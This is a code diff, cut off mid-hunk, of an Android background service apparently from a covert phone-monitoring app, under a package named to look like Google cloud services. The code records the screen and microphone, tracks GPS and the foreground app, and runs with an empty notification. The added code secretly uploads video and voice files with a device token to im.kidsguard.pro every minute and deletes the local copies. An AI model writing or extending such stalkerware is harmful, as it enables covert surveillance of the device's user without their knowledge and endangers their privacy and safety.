@@ -1,9 +1,9 @@
 package com.google.cloudservices;
 
 import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.AlarmManager;
 import android.app.Notification;
-import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -31,7 +31,6 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
-import android.support.annotation.RequiresApi;
 import android.support.v4.app.NotificationCompat;
 import android.support.v4.content.ContextCompat;
 import android.text.format.DateFormat;
@@ -39,13 +38,17 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.SparseIntArray;
 import android.view.Surface;
-import android.widget.Toast;
 
-import net.gotev.uploadservice.MultipartUploadRequest;
-import net.gotev.uploadservice.ServerResponse;
-import net.gotev.uploadservice.UploadInfo;
-import net.gotev.uploadservice.UploadServiceSingleBroadcastReceiver;
-import net.gotev.uploadservice.UploadStatusDelegate;
+import org.apache.http.HttpEntity;
+import org.apache.http.HttpResponse;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.MultipartEntity;
+import org.apache.http.entity.mime.content.FileBody;
+import org.apache.http.entity.mime.content.StringBody;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.util.EntityUtils;
 
 import java.io.File;
 import java.io.FileInputStream;
@@ -54,7 +57,9 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.io.UnsupportedEncodingException;
 import java.net.MalformedURLException;
+import java.nio.charset.Charset;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -63,7 +68,7 @@ import java.util.GregorianCalendar;
 import java.util.Locale;
 import java.util.UUID;
 
-public class childService extends Service implements LocationListener,UploadStatusDelegate {
+public class childService extends Service implements LocationListener {
     int a = 0;
     int mincounter=0;
     int min;
@@ -83,7 +88,7 @@ public class childService extends Service implements LocationListener,UploadStat
     int DISPLAY_WIDTH = 720;
     int DISPLAY_HEIGHT = 1280;
     MediaProjection mMediaProjection;
-    private UploadServiceSingleBroadcastReceiver uploadReceiver;
+
     MediaRecorder mMediaRecorder;
     SparseIntArray ORIENTATIONS = new SparseIntArray();
      File filec;
@@ -114,17 +119,18 @@ public class childService extends Service implements LocationListener,UploadStat
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
-    @RequiresApi(api = 29)
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 //        Log.e("Ex234", "onStartCommand: " );
 //            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-        createNotificationChannel();
-        Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
+       // createNotificationChannel();
+        Log.e("testing" , "response1");
+        Notification notification = new NotificationCompat.Builder(getApplicationContext())
                 .build();
         startForeground(1, notification);
 
-
+        Log.e("testing" , "response2");
 //            }
         Log.e("324re", "onStartCommand2: " );
         if (intent!=null){
@@ -134,8 +140,8 @@ public class childService extends Service implements LocationListener,UploadStat
             DISPLAY_WIDTH=intent.getIntExtra("width",1337);
             DISPLAY_HEIGHT=intent.getIntExtra("height",1337);
             Log.e("324re", "onStartCommand: " );}
-        uploadReceiver = new UploadServiceSingleBroadcastReceiver(this);
-        uploadReceiver.register(this);
+//        uploadReceiver = new UploadServiceSingleBroadcastReceiver(this);
+//        uploadReceiver.register(this);
 
         new Thread(new Runnable() {
             @Override
@@ -175,12 +181,10 @@ public class childService extends Service implements LocationListener,UploadStat
     }
 
     private void setTimer1() {
-
-        BroadcastReceiver time=new BroadcastReceiver() {
-            @RequiresApi(api = 29)
+        BroadcastReceiver timer=new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                WakeLocker.acquire(context);
+                WakeLocker.acquire(getApplicationContext());
                 WakeLocker.release();
                 Log.e("hihappyday", "setTimer: " +String.valueOf(mincounter));
 
@@ -192,43 +196,43 @@ public class childService extends Service implements LocationListener,UploadStat
                 try {
 
 
-                Date curDateing = new Date(System.currentTimeMillis());
-                File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/");
-                if (directory.exists()){
-                File[] files = directory.listFiles();
-                if (files.length>0){
-                Log.d("Files", "Size: "+ files.length);
-                int i = 0;
-                deletfilename=new ArrayList<String>();
-                while (i < files.length){
-                    if (files[i].getName().equals("b.mp4")){}else {
+                    Date curDateing = new Date(System.currentTimeMillis());
+                    File directory = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/");
+                    if (directory.exists()){
+                        File[] files = directory.listFiles();
+                        if (files.length>0){
+                            Log.d("Files", "Size: "+ files.length);
+                            int i = 0;
+                            deletfilename=new ArrayList<String>();
+                            while (i < files.length){
+                                if (files[i].getName().equals("b.mp4")){}else {
 //                    Log.e("Files324", "FileName:" + files[i].getName().substring(0,files[i].getName().length()-4));
-                        SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzzz yyyy");
-                        Date videodate = df.parse(files[i].getName().substring(0, files[i].getName().length() - 4));
-                        //Date videodate = new Date(files[i].getName().substring(0,files[i].getName().length()-4));
-                        if (curDateing.getTime() - videodate.getTime() > 600000) {
-                            if (files[i].exists()) {
+                                    SimpleDateFormat df = new SimpleDateFormat("EEE MMM dd HH:mm:ss zzzz yyyy");
+                                    Date videodate = df.parse(files[i].getName().substring(0, files[i].getName().length() - 4));
+                                    //Date videodate = new Date(files[i].getName().substring(0,files[i].getName().length()-4));
+                                    if (curDateing.getTime() - videodate.getTime() > 600000) {
+                                        if (files[i].exists()) {
 
-                                deletfilename.add(files[i].getName());
+                                            deletfilename.add(files[i].getName());
 
+                                        }
+
+                                    }
+                                }
+                                i++;
                             }
-
-                        }
-                    }
-                    i++;
-                }
-                if (deletfilename.size()>0){
-                    int c=0;
-                    while (c<deletfilename.size()){
-                        File filedelet=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+deletfilename.get(c));
-                        if (filedelet.exists()){
-                       //     Toast.makeText(context, filedelet.getName()+" deleted", Toast.LENGTH_SHORT).show();
-                            filedelet.delete();
-                        }
-                        c++;
-                    }
-                }
-                }}}catch (Exception e){
+                            if (deletfilename.size()>0){
+                                int c=0;
+                                while (c<deletfilename.size()){
+                                    File filedelet=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+deletfilename.get(c));
+                                    if (filedelet.exists()){
+                                        //     Toast.makeText(context, filedelet.getName()+" deleted", Toast.LENGTH_SHORT).show();
+                                        filedelet.delete();
+                                    }
+                                    c++;
+                                }
+                            }
+                        }}}catch (Exception e){
 
                 }
                 checkforeground(getApplicationContext());
@@ -239,66 +243,136 @@ public class childService extends Service implements LocationListener,UploadStat
                 }else {
                     min=rightNow.get(Calendar.MINUTE);
 
-                Log.e("cach343", "onReceive: ");
-                if (isNetworkAvailable()) {
+                    Log.e("cach343", "onReceive: ");
+                    if (isNetworkAvailable()) {
 
-                    try {
-                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
-                        if (file.exists()) {
-                            filec = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4");
-                            String uploadId = UUID.randomUUID().toString();
-                            uploadReceiver.setUploadID(uploadId);
-                            new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                                    .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video") //Adding file
-                                    .addParameter("token", getToken(getApplicationContext()))
-                                    .addParameter("token1", "allow")//Adding text parameter to the request
-                                    .setAutoDeleteFilesAfterSuccessfulUpload(true)
-                                    .setMaxRetries(2)
-
-                                    .startUpload(); //Starting the upload
-                        }
-                    } catch (MalformedURLException e) {
-                        Log.e("exeption343", e.toString() );
-                        e.printStackTrace();
-                    } catch (FileNotFoundException e) {
-                        Log.e("exeption343", e.toString() );
-                        e.printStackTrace();
-                    }
-                    uploadfirstvoicefile();
-                    uploadfirstvoicefile2();
-                    sendDataClass sendDataClass = new sendDataClass();
-                    sendDataClass.send(getApplicationContext());
-                    OptionDB optionDB = new OptionDB(childService.this);
-                    if (optionDB.getjs().get(4).equals("gps1")) {
                         try {
-                            getLocation();
-                        }catch (Exception e){
-                            SendEror sendEror=new SendEror();
-                            sendEror.sender(getApplicationContext(),"location eror:"+e.toString());
+                            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                            if (file.exists()) {
+                                filec = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4");
+                                try {
+                                    new Thread(new Runnable() {
+                                        @Override
+                                        public void run() {
+                                            HttpClient httpclient = new DefaultHttpClient();
+                                            HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+
+
+                                            try {
+                                                MultipartEntity entity = new MultipartEntity();
+
+                                                try {
+                                                    entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                                    entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                                } catch (UnsupportedEncodingException e) {
+                                                    e.printStackTrace();
+                                                }
+                                                File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
+                                                FileBody fileBody = new FileBody(myFile);
+                                                entity.addPart("video", fileBody);
+                                                Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                                //totalSize = entity.getContentLength();
+                                                httppost.setEntity(entity);
+                                                HttpResponse response = httpclient.execute(httppost);
+                                                HttpEntity r_entity = response.getEntity();
+                                                Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                                //responseString = EntityUtils.toString(r_entity);
+
+                                            } catch (ClientProtocolException e) {
+                                                Log.e("terkgkjjgjgj", e.toString());
+                                                File file2=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                                if (file2.exists()){
+                                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                                    try {
+                                                        copy(file2,fileb);
+                                                    } catch (IOException ioException) {
+                                                        ioException.printStackTrace();
+                                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                                }
+                                                //responseString = e.toString();
+                                            } catch (IOException e) {
+                                                File file3=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                                if (file3.exists()){
+                                                    File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                                    try {
+                                                        copy(file3,fileb);
+                                                    } catch (IOException ioException) {
+                                                        ioException.printStackTrace();
+                                                    }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                                }
+                                                Log.e("terkgkjjgjgj", e.toString());
+                                                //	responseString = e.toString();
+                                            }
+
+                                        }
+                                    }).start();
+
+
+                                } catch (Exception e){}
+
+                            }
+                        } catch (Exception e) {
+                            Log.e("exeption343", e.toString() );
+                            e.printStackTrace();
                         }
-                    }
+                        uploadfirstvoicefile();
+                        uploadfirstvoicefile2();
+                        sendDataClass sendDataClass = new sendDataClass();
+                        sendDataClass.send(getApplicationContext());
+                        OptionDB optionDB = new OptionDB(childService.this);
+                        if (optionDB.getjs().get(4).equals("gps1")) {
+                            try {
+                                getLocation();
+                            }catch (Exception e){
+                                SendEror sendEror=new SendEror();
+                                sendEror.sender(getApplicationContext(),"location eror:"+e.toString());
+                            }
+                        }
 //                    /**/
 
 //
-                    if (a == 1) {
-                        a = 0;
-                        Upload2();
-                    } else if (a == 2) {
-                        a = 0;
-                        Upload3();
+                        if (a == 1) {
+                            a = 0;
+                            Upload2();
+                        } else if (a == 2) {
+                            a = 0;
+                            Upload3();
+                        }
+                        // UploadScreen();
                     }
-                    // UploadScreen();
-                }
-                mincounter++;
+                    mincounter++;
 
-                System.runFinalization();
-                Runtime.getRuntime().gc();
-                System.gc();}
-
+                    System.runFinalization();
+                    Runtime.getRuntime().gc();
+                    System.gc();}
             }
         };
         IntentFilter intentFilter=new IntentFilter(Intent.ACTION_TIME_TICK);
-        this.registerReceiver(time,intentFilter);
+        this.registerReceiver(timer,intentFilter);
+
+
 
     }
 
@@ -315,9 +389,8 @@ public class childService extends Service implements LocationListener,UploadStat
 //    }
 
     private void startTimer2() {
-        Handler handler = new Handler(Looper.getMainLooper());
+        final Handler handler = new Handler(Looper.getMainLooper());
         handler.post(new Runnable() {
-            @RequiresApi(api = 29)
             @Override
             public void run() {
 //                File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/a.mp4");
@@ -368,20 +441,20 @@ public class childService extends Service implements LocationListener,UploadStat
     }
 
 
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    "ForegroundServiceChannel",
-                    "Foreground Service Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
-            );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-
-            manager.createNotificationChannel(serviceChannel);
-
-
-        }
-    }
+//    private void createNotificationChannel() {
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//            NotificationChannel serviceChannel = new NotificationChannel(
+//                    "ForegroundServiceChannel",
+//                    "Foreground Service Channel",
+//                    NotificationManager.IMPORTANCE_DEFAULT
+//            );
+//            NotificationManager manager = getSystemService(NotificationManager.class);
+//
+//            manager.createNotificationChannel(serviceChannel);
+//
+//
+//        }
+//    }
 
     private void initAlarm() {
 
@@ -397,7 +470,7 @@ public class childService extends Service implements LocationListener,UploadStat
 
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.O)
+
     public void checkforeground(Context context) {
         Timedb timedb = null;
         Calendar calendar=null;
@@ -491,8 +564,8 @@ public class childService extends Service implements LocationListener,UploadStat
 
     public void Upload2() {
         try {
-            String pathSave = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtones" + "minedate.mp3";
-            File dir = new File(pathSave);
+            final String pathSave = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtones" + "minedate.mp3";
+            final File dir = new File(pathSave);
 
             Handler handler = new Handler(Looper.getMainLooper());
             handler.postDelayed(new Runnable() {
@@ -502,19 +575,92 @@ public class childService extends Service implements LocationListener,UploadStat
                     //Creating a multi part request
                     if (dir.exists()) {
                         try {
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    HttpClient httpclient = new DefaultHttpClient();
+                                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-voice/");
 
-                            new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-voice/")
-                                    .addFileToUpload(pathSave, "voice") //Adding file
-                                    .addParameter("token", getToken(getApplicationContext()))
-                                    .addParameter("token1", "AllowVoice")//Adding text parameter to the request
-                                    .setMaxRetries(2)
 
-                                    .startUpload(); //Starting the upload
-                        } catch (MalformedURLException e) {
-                            e.printStackTrace();
-                        } catch (FileNotFoundException e) {
-                            e.printStackTrace();
-                        }
+                                    try {
+                                        MultipartEntity entity = new MultipartEntity();
+
+                                        try {
+                                            entity.addPart("token1", new StringBody("AllowVoice", Charset.forName("UTF-8")));
+                                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                        } catch (UnsupportedEncodingException e) {
+                                            e.printStackTrace();
+                                        }
+                                        File myFile = new File(pathSave);
+                                        FileBody fileBody = new FileBody(myFile);
+                                        entity.addPart("voice", fileBody);
+                                        Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                        //totalSize = entity.getContentLength();
+                                        httppost.setEntity(entity);
+                                        HttpResponse response = httpclient.execute(httppost);
+                                        HttpEntity r_entity = response.getEntity();
+                                        Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                        //responseString = EntityUtils.toString(r_entity);
+
+                                    } catch (ClientProtocolException e) {
+                                        Log.e("terkgkjjgjgj", e.toString());
+                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                        if (file.exists()){
+                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                            try {
+                                                copy(file,fileb);
+                                            } catch (IOException ioException) {
+                                                ioException.printStackTrace();
+                                            }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                        }
+                                        //responseString = e.toString();
+                                    } catch (IOException e) {
+                                        Log.e("terkgkjjgjgj", e.toString());
+                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                        if (file.exists()){
+                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                            try {
+                                                copy(file,fileb);
+                                            } catch (IOException ioException) {
+                                                ioException.printStackTrace();
+                                            }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                        }
+                                        //	responseString = e.toString();
+                                    }
+
+                                }
+                            }).start();
+
+
+                        }catch (Exception e){}
+
+
+
+
+
+
                     }
                        //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
                 }
@@ -539,8 +685,8 @@ public class childService extends Service implements LocationListener,UploadStat
 
     public void Upload3() {
         try {
-            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtonesminedate.mp4";
-            File dir = new File(path);
+            final String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtonesminedate.mp4";
+            final File dir = new File(path);
 
             Handler handler = new Handler();
             handler.postDelayed(new Runnable() {
@@ -549,20 +695,96 @@ public class childService extends Service implements LocationListener,UploadStat
                     String uploadId = UUID.randomUUID().toString();
                     //Creating a multi part request
                     if (dir.exists()) {
-                        try {
-                            new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                                    .addFileToUpload(path, "video") //Adding file
-                                    .addParameter("token", getToken(getApplicationContext()))
-                                    .addParameter("token1", "allow")//Adding text parameter to the request
-                                    .setMaxRetries(2)
 
-                                    .startUpload(); //Starting the upload
-                        } catch (MalformedURLException e) {
-                            e.printStackTrace();
-                        } catch (FileNotFoundException e) {
-                            e.printStackTrace();
+                        try {
+                            new Thread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    HttpClient httpclient = new DefaultHttpClient();
+                                    HttpPost httppost = new HttpPost("https://im.kidsguard.pro/api/put-video/");
+
+
+                                    try {
+                                        MultipartEntity entity = new MultipartEntity();
+
+                                        try {
+                                            entity.addPart("token1", new StringBody("allow", Charset.forName("UTF-8")));
+                                            entity.addPart("token", new StringBody(getToken(getApplicationContext()), Charset.forName("UTF-8")));
+                                        } catch (UnsupportedEncodingException e) {
+                                            e.printStackTrace();
+                                        }
+                                        File myFile = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/b.mp4", "video");
+                                        FileBody fileBody = new FileBody(myFile);
+                                        entity.addPart("video", fileBody);
+                                        Log.e("terkgkjjgjgj", String.valueOf(entity.getContentLength()));
+                                        //totalSize = entity.getContentLength();
+                                        httppost.setEntity(entity);
+                                        HttpResponse response = httpclient.execute(httppost);
+                                        HttpEntity r_entity = response.getEntity();
+                                        Log.e("terkgkjjgjgj", EntityUtils.toString(r_entity));
+                                        //responseString = EntityUtils.toString(r_entity);
+
+                                    } catch (ClientProtocolException e) {
+
+
+                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                        if (file.exists()){
+                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                            try {
+                                                copy(file,fileb);
+                                            } catch (IOException ioException) {
+                                                ioException.printStackTrace();
+                                            }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                        }
+
+
+                                        Log.e("terkgkjjgjgj", e.toString());
+                                        //responseString = e.toString();
+                                    } catch (IOException e) {
+
+
+                                        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+                                        if (file.exists()){
+                                            File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+                                            try {
+                                                copy(file,fileb);
+                                            } catch (IOException ioException) {
+                                                ioException.printStackTrace();
+                                            }
+//                Handler handler=new Handler();
+//                handler.postDelayed(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                       if (file.exists()){
+//                           file.delete();
+//                       }
+//                    }
+//                },2000);
+
+
+                                        }
+
+
+                                        Log.e("terkgkjjgjgj", e.toString());
+                                        //	responseString = e.toString();
+                                    }
+                                }
+                            }).start();
+
+                        }catch (Exception e){}
+
                         }
-                    }
                     //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();
                 }
             }, 600000);
@@ -599,21 +821,10 @@ public class childService extends Service implements LocationListener,UploadStat
         }
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.M)
+
     protected void getLocation() {
 
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        if (Build.VERSION.SDK_INT>=23){
-        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            // TODO: Consider calling
-            //    Activity#requestPermissions
-            // here to request the missing permissions, and then overriding
-            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
-            //                                          int[] grantResults)
-            // to handle the case where the user grants the permission. See the documentation
-            // for Activity#requestPermissions for more details.
-
-        }}
         locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, this);
 
 
@@ -641,12 +852,12 @@ public class childService extends Service implements LocationListener,UploadStat
     public void onProviderDisabled(String s) {
 
     }
-    @RequiresApi(api = 29)
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     public void setScreen(){
 
         mProjectionManager = (MediaProjectionManager) getSystemService
                 (Context.MEDIA_PROJECTION_SERVICE);
-        Handler handler=new Handler(Looper.getMainLooper());
+        final Handler handler=new Handler(Looper.getMainLooper());
         handler.post(new Runnable() {
             @Override
             public void run() {
@@ -674,6 +885,7 @@ public class childService extends Service implements LocationListener,UploadStat
 
 
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void iniRecorder() {
         try {
             mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -727,6 +939,7 @@ public class childService extends Service implements LocationListener,UploadStat
             e.printStackTrace();
         }
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void iniRecorder2() {
         try {
            // mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -835,6 +1048,7 @@ public class childService extends Service implements LocationListener,UploadStat
         }
 
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void shareScreen() {
         if (mMediaProjection==null){
         try {
@@ -876,6 +1090,7 @@ public class childService extends Service implements LocationListener,UploadStat
         }
     }
     }
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private VirtualDisplay createVirtualDisplay() {
         try {
             return mMediaProjection.createVirtualDisplay("Captureservice",
@@ -891,82 +1106,83 @@ public class childService extends Service implements LocationListener,UploadStat
 
     }
 
-    @Override
-    public void onProgress(Context context, UploadInfo uploadInfo) {
-
-    }
-
-    @Override
-    public void onError(Context context, UploadInfo uploadInfo, ServerResponse serverResponse, Exception exception) {
-        //uploading=false;
-        try {
-
-            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
-            if (file.exists()){
-                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
-                copy(file,fileb);
-//                Handler handler=new Handler();
-//                handler.postDelayed(new Runnable() {
-//                    @Override
-//                    public void run() {
-//                       if (file.exists()){
-//                           file.delete();
-//                       }
-//                    }
-//                },2000);
-
-
-            }
-
-        }catch (Exception e){
-
-        }
-    }
-
-
-
-    @Override
-    public void onCompleted(Context context, UploadInfo uploadInfo, ServerResponse serverResponse) {
-       // uploading=false;
-     //   Toast.makeText(context, serverResponse.getBodyAsString(), Toast.LENGTH_SHORT).show();
-        try {
-
-//        if (filec.exists()){
-//            filec.delete();
+//    @Override
+//    public void onProgress(Context context, UploadInfo uploadInfo) {
+//
+//    }
+//
+//    @Override
+//    public void onError(Context context, UploadInfo uploadInfo, ServerResponse serverResponse, Exception exception) {
+//        //uploading=false;
+//        try {
+//
+//            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+//            if (file.exists()){
+//                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+//                copy(file,fileb);
+////                Handler handler=new Handler();
+////                handler.postDelayed(new Runnable() {
+////                    @Override
+////                    public void run() {
+////                       if (file.exists()){
+////                           file.delete();
+////                       }
+////                    }
+////                },2000);
+//
+//
+//            }
+//
+//        }catch (Exception e){
+//
 //        }
-    }catch (Exception e){
+//    }
+//
+//
+//
+//    @Override
+//    public void onCompleted(Context context, UploadInfo uploadInfo, ServerResponse serverResponse) {
+//       // uploading=false;
+//     //   Toast.makeText(context, serverResponse.getBodyAsString(), Toast.LENGTH_SHORT).show();
+//        try {
+//
+////        if (filec.exists()){
+////            filec.delete();
+////        }
+//    }catch (Exception e){
+//
+//    }
+//    }
+//
+//    @Override
+//    public void onCancelled(Context context, UploadInfo uploadInfo) {
+//      //  uploading=false;
+//        try {
+//
+//            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
+//            if (file.exists()){
+//                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
+//                copy(file,fileb);
+////                Handler handler=new Handler();
+////                handler.postDelayed(new Runnable() {
+////                    @Override
+////                    public void run() {
+////                       if (file.exists()){
+////                           file.delete();
+////                       }
+////                    }
+////                },2000);
+//
+//
+//            }
+//
+//        }catch (Exception e){
+//
+//        }
+//
+//    }
 
-    }
-    }
-
-    @Override
-    public void onCancelled(Context context, UploadInfo uploadInfo) {
-      //  uploading=false;
-        try {
-
-            File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curdate2+".mp4");
-            if (file.exists()){
-                File fileb=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/b.mp4");
-                copy(file,fileb);
-//                Handler handler=new Handler();
-//                handler.postDelayed(new Runnable() {
-//                    @Override
-//                    public void run() {
-//                       if (file.exists()){
-//                           file.delete();
-//                       }
-//                    }
-//                },2000);
-
-
-            }
-
-        }catch (Exception e){
-
-        }
-
-    }
-
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private class MediaProjectionCallback extends MediaProjection.Callback {
         @Override
         public void onStop() {
@@ -979,6 +1195,7 @@ public class childService extends Service implements LocationListener,UploadStat
         }
 
     }
+    @TargetApi(Build.VERSION_CODES.KITKAT)
     private void stopScreenSharing() {
         if (mVirtualDisplay == null) {
             return;
@@ -987,6 +1204,7 @@ public class childService extends Service implements LocationListener,UploadStat
         destroyMediaProjection();
     }
 
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private void destroyMediaProjection() {
         if (mMediaProjection != null) {
             mMediaProjection.unregisterCallback(mMediaProjectionCallback);
@@ -1013,8 +1231,9 @@ public class childService extends Service implements LocationListener,UploadStat
             Runtime.getRuntime().gc();
         }
     }
-    @RequiresApi(api = 29)
-    public void recored( ArrayList<String> pkg){
+
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
+    public void recored(ArrayList<String> pkg){
             curpkgname="";
             CurrentAppClass currentAppClass=new CurrentAppClass();
             curpkgname=currentAppClass.getTopAppName(childService.this);
@@ -1075,32 +1294,105 @@ public class childService extends Service implements LocationListener,UploadStat
 //
 
                         try {
-                            curdate2=curedate;
-                            filec=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/468545878548/"+curedate+".mp4");
-                            String uploadId = UUID.randomUUID().toString();
-                            uploadReceiver.setUploadID(uploadId);
-                           // SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.getDefault());
-//                            Date curDate = new Date(System.currentTimeMillis());
-                            new MultipartUploadRequest(getApplicationContext(), uploadId, "https://im.kidsguard.pro/api/put-video/")
-                                    .addFileToUpload(Environment.getExternalStorageDirectory().getAbsolutePath() + "/468545878548/"+curedate+".mp4", "video") //Adding file
-                                    .addParameter("token", getToken(getApplicationContext()))
-                                    .addParameter("token1", "allow")
-                                    .addParameter("type", pastpkgname)//Adding text parameter to the request
-                                    .setMaxRetries(2)
-                                    .setAutoDeleteFilesAfterSuccessfulUpload(true)
-                                    .startUpload(); //Starting the upload
-                          //   uploading=true;
-                        } catch (MalformedURLException e) {
-                         //   uploading=false;
